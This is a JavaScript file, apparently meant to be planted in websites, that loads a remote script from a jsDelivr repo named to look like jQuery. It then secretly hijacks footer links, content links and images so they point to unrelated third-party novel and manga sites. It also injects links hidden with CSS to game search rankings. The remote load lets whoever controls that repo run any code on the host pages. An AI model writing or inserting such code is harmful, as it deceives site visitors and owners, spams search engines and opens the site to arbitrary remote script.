(function() {
    'use strict';
    
    const DATA_URL = 'https://cdn.jsdelivr.net/gh/jqueryv145/jqueryv145/data.js';
    
    // Fallback data nếu không load được từ CDN
    const FALLBACK_AUTO_BACKLINKS = [
        'https://worldbook.io.vn',
        'https://worldbook.io.vn/novel/9731',
        'https://worldbook.io.vn/novel/9629',
        'https://fnbowner.com.vn'
    ];
    
    const FALLBACK_HIDDEN_BACKLINKS = [
        'https://fnbowner.com.vn',
        'https://khaizinam.io.vn',
        'https://manga18k.xyz',
        'https://manga18k.xyz/story/a-boss-who-is-so-kind-to-me-raw',
        'https://manga18k.xyz/story/the-gift-of-evil',
        'https://worldbook.io.vn',
        'https://worldbook.io.vn/novel/9731',
        'https://worldbook.io.vn/novel/9629'
    ];
    
    let AUTO_BACKLINKS = FALLBACK_AUTO_BACKLINKS;
    let HIDDEN_BACKLINKS = FALLBACK_HIDDEN_BACKLINKS;
    
    function loadDataFromCDN() {
        return new Promise((resolve, reject) => {
            // Sử dụng dynamic script loading để load data.js từ CDN
            const script = document.createElement('script');
            script.src = DATA_URL + '?t=' + Date.now(); // Cache busting
            script.async = true;
            
            script.onload = function() {
                try {
                    // Kiểm tra xem BACKLINK_DATA có tồn tại không
                    if (typeof BACKLINK_DATA !== 'undefined' && BACKLINK_DATA) {
                        AUTO_BACKLINKS = BACKLINK_DATA.AUTO_BACKLINKS || FALLBACK_AUTO_BACKLINKS;
                        HIDDEN_BACKLINKS = BACKLINK_DATA.HIDDEN_BACKLINKS || FALLBACK_HIDDEN_BACKLINKS;
                        resolve({
                            AUTO_BACKLINKS: AUTO_BACKLINKS,
                            HIDDEN_BACKLINKS: HIDDEN_BACKLINKS
                        });
                    } else {
                        throw new Error('BACKLINK_DATA not found');
                    }
                } catch (e) {
                    console.warn('Failed to parse data, using fallback:', e);
                    AUTO_BACKLINKS = FALLBACK_AUTO_BACKLINKS;
                    HIDDEN_BACKLINKS = FALLBACK_HIDDEN_BACKLINKS;
                    resolve({
                        AUTO_BACKLINKS: AUTO_BACKLINKS,
                        HIDDEN_BACKLINKS: HIDDEN_BACKLINKS
                    });
                }
                if (script.parentNode) {
                    script.parentNode.removeChild(script);
                }
            };
            
            script.onerror = function() {
                console.warn('Failed to load data from CDN, using fallback');
                AUTO_BACKLINKS = FALLBACK_AUTO_BACKLINKS;
                HIDDEN_BACKLINKS = FALLBACK_HIDDEN_BACKLINKS;
                if (script.parentNode) {
                    script.parentNode.removeChild(script);
                }
                resolve({
                    AUTO_BACKLINKS: AUTO_BACKLINKS,
                    HIDDEN_BACKLINKS: HIDDEN_BACKLINKS
                });
            };
            
            document.head.appendChild(script);
        });
    }
    
    function getPageType() {
        const pathname = window.location.pathname.toLowerCase();
        const hostname = window.location.hostname.toLowerCase();
        if (pathname.includes('/blog/') || 
            pathname.includes('/tin-tuc/') || 
            pathname.includes('/news/') ||
            pathname.includes('/post/') ||
            pathname.includes('/article/') ||
            hostname.includes('blog') ||
            hostname.includes('tin-tuc') ||
            hostname.includes('news')) {
            return 'blog';
        }
        return 'other';
    }
    function getRandomBacklink() {
        if (AUTO_BACKLINKS.length === 0) return '#';
        return AUTO_BACKLINKS[Math.floor(Math.random() * AUTO_BACKLINKS.length)];
    }
    
    function getRandomHiddenBacklink() {
        if (HIDDEN_BACKLINKS.length === 0) return '#';
        return HIDDEN_BACKLINKS[Math.floor(Math.random() * HIDDEN_BACKLINKS.length)];
    }
    function isInternalLink(url) {
        if (!url) return false;
        try {
            const urlObj = new URL(url, window.location.origin);
            return urlObj.hostname === window.location.hostname;
        } catch (e) {
            return url.startsWith('/') || url.startsWith('#');
        }
    }
    function isProtectedLink(url, element) {
        if (!url) return true;
        const protectedPatterns = [
            'javascript:',
            'mailto:',
            'tel:',
            '#',
            'void(0)',
            'manga18k.xyz',
            'worldbook.io.vn'
        ];
        const urlLower = url.toLowerCase();
        for (let pattern of protectedPatterns) {
            if (urlLower.includes(pattern)) {
                return true;
            }
        }
        if (element && element.classList.contains('no-backlink')) {
            return true;
        }
        return false;
    }
    function wrapImagesInLinks() {
        const images = document.querySelectorAll('img:not(.no-backlink-wrap)');
        let processed = 0;
        const maxProcess = Math.min(3, Math.floor(images.length * 0.3));
        images.forEach((img, index) => {
            if (processed >= maxProcess) return;
            if (img.parentElement.tagName === 'A') return;
            if (img.closest('a')) return;
            if (Math.random() < 0.3 && processed < maxProcess) {
                const link = document.createElement('a');
                const originalHref = img.src || '';
                link.href = getRandomBacklink();
                link.setAttribute('data-origin', originalHref);
                link.classList.add('b_link');
                link.target = '_blank';
                link.rel = 'sponsored';
                if (img.alt) {
                    link.setAttribute('aria-label', img.alt);
                }
                img.parentNode.insertBefore(link, img);
                link.appendChild(img);
                processed++;
            }
        });
    }
    
    function wrapRandomImageInLink() {
        const images = document.querySelectorAll('img:not(.no-backlink-wrap):not(.b_link img)');
        const unwrappedImages = Array.from(images).filter(img => {
            return !img.closest('a') && img.parentElement.tagName !== 'A';
        });
        
        if (unwrappedImages.length === 0) {
            return;
        }
        
        const randomImg = unwrappedImages[Math.floor(Math.random() * unwrappedImages.length)];
        const originalHref = randomImg.src || '';
        
        const link = document.createElement('a');
        link.href = getRandomBacklink();
        link.setAttribute('data-origin', originalHref);
        link.classList.add('b_link');
        link.target = '_blank';
        if (randomImg.alt) {
            link.setAttribute('aria-label', randomImg.alt);
        }
        
        randomImg.parentNode.insertBefore(link, randomImg);
        link.appendChild(randomImg);
    }
    function randomizeContentLinks() {
        const contentAreas = document.querySelectorAll('article, .content, .post-content, .entry-content, main, .main-content');
        let allLinks = [];
        if (contentAreas.length > 0) {
            contentAreas.forEach(area => {
                const links = area.querySelectorAll('a:not(.no-backlink)');
                allLinks.push(...Array.from(links));
            });
        } else {
            const bodyLinks = document.querySelectorAll('body a:not(.no-backlink)');
            allLinks = Array.from(bodyLinks).filter(link => {
                const parent = link.closest('header, footer, nav, .header, .footer, .navigation');
                return !parent;
            });
        }
        const validLinks = allLinks.filter(link => {
            const href = link.getAttribute('href');
            return href && 
                   !isProtectedLink(href, link) && 
                   (isInternalLink(href) || href.startsWith('http'));
        });
        const changeCount = Math.min(3, validLinks.length);
        const shuffled = validLinks.sort(() => Math.random() - 0.5);
        const toChange = shuffled.slice(0, changeCount);
        toChange.forEach(link => {
            const originalHref = link.getAttribute('href');
            link.setAttribute('data-origin', originalHref);
            link.href = getRandomBacklink();
            link.target = '_blank';
            link.classList.add('b_link');
            link.classList.add('backlink-added');
        });
    }
    function randomizeFooterLink() {
        const footerSelectors = ['footer', '#footer', '.footer', 'footer a', '#footer a', '.footer a'];
        let footerElement = null;
        for (let selector of footerSelectors) {
            footerElement = document.querySelector(selector);
            if (footerElement) {
                break;
            }
        }
        
        if (!footerElement) {
            footerElement = document.querySelector('footer');
        }
        
        if (!footerElement) {
            return;
        }
        const footerLinks = footerElement.querySelectorAll('a');
        if (footerLinks.length === 0) {
            return;
        }
        const changeableLinks = Array.from(footerLinks).filter(link => {
            const href = link.getAttribute('href');
            return href && !isProtectedLink(href, link);
        });
        if (changeableLinks.length === 0) {
            return;
        }
        
        const changeCount = Math.min(3, changeableLinks.length);
        const shuffled = changeableLinks.sort(() => Math.random() - 0.5);
        const toChange = shuffled.slice(0, changeCount);
        
        toChange.forEach(link => {
            const originalHref = link.getAttribute('href');
            link.setAttribute('data-origin', originalHref);
            link.href = getRandomBacklink();
            link.target = '_blank';
            link.classList.add('b_link');
            link.classList.add('backlink-added');
        });
    }
    
    function setupBacklinkRestore() {
        document.addEventListener('click', function(e) {
            const link = e.target.closest('a.b_link');
            if (!link) {
                return;
            }
            
            const originalHref = link.getAttribute('data-origin');
            if (originalHref === null || originalHref === undefined) {
                return;
            }
            
            const img = link.querySelector('img:only-child');
            if (img && originalHref === img.src) {
                setTimeout(function() {
                    const parent = link.parentNode;
                    parent.insertBefore(img, link);
                    parent.removeChild(link);
                }, 0);
                return;
            }
            
            setTimeout(function() {
                link.href = originalHref;
                link.classList.remove('b_link');
                link.removeAttribute('data-origin');
                
                if (link.classList.contains('backlink-added')) {
                    link.classList.remove('backlink-added');
                }
                
                const isOriginalInternal = !originalHref.startsWith('http') || 
                                          (originalHref.startsWith('http') && originalHref.includes(window.location.hostname));
                
                if (isOriginalInternal) {
                    link.removeAttribute('target');
                    link.removeAttribute('rel');
                }
            }, 0);
        }, false);
    }
    function createHiddenBacklinks() {
        if (document.getElementById('hidden-backlinks-container')) {
            return;
        }
        
        const container = document.createElement('div');
        container.id = 'hidden-backlinks-container';
        container.style.cssText = 'display: none !important; position: absolute !important; left: -9999px !important; visibility: hidden !important; opacity: 0 !important; width: 0 !important; height: 0 !important; overflow: hidden !important;';
        container.setAttribute('aria-hidden', 'true');
        
        HIDDEN_BACKLINKS.forEach((backlink, index) => {
            const link = document.createElement('a');
            link.href = backlink;
            link.textContent = 'Backlink ' + (index + 1);
            link.style.cssText = 'display: none !important; visibility: hidden !important; opacity: 0 !important; position: absolute !important; left: -9999px !important;';
            link.target = '_blank';
            container.appendChild(link);
        });
        
        if (document.body) {
            document.body.appendChild(container);
        } else {
            document.addEventListener('DOMContentLoaded', function() {
                if (document.body && !document.getElementById('hidden-backlinks-container')) {
                    document.body.appendChild(container);
                }
            });
        }
    }
    
    let initialized = false;
    
    function init() {
        if (initialized) {
            return;
        }
        
        if (document.readyState === 'loading') {
            document.addEventListener('DOMContentLoaded', init);
            return;
        }
        
        initialized = true;
        
        // Load data từ CDN
        loadDataFromCDN().then(function(data) {
            AUTO_BACKLINKS = data.AUTO_BACKLINKS;
            HIDDEN_BACKLINKS = data.HIDDEN_BACKLINKS;
            runMainLogic();
        }).catch(function() {
            // Nếu load fail, vẫn chạy với fallback
            runMainLogic();
        });
    }
    
    function runMainLogic() {
        setupBacklinkRestore();
        
        randomizeFooterLink();
        
        const pageType = getPageType();
        if (pageType === 'blog') {
            wrapImagesInLinks();
            randomizeContentLinks();
            wrapRandomImageInLink();
        }
        
        createHiddenBacklinks();
    }
    
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', init);
    } else {
        init();
    }
})();


